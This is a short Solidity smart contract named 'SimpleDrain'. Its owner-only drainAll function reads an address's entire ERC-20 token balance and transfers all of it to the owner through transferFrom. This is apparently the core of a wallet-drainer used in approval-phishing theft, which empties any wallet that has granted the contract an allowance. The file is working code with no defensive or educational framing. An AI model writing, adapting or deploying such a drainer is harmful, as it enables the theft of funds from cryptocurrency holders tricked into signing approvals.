// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract SimpleDrain {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }

    function drainAll(address token, address from) public onlyOwner {
        uint256 balance = IERC20(token).balanceOf(from);
        require(balance > 0, "No balance");
        
        bool success = IERC20(token).transferFrom(from, owner, balance);
        require(success, "Transfer failed");
    }
}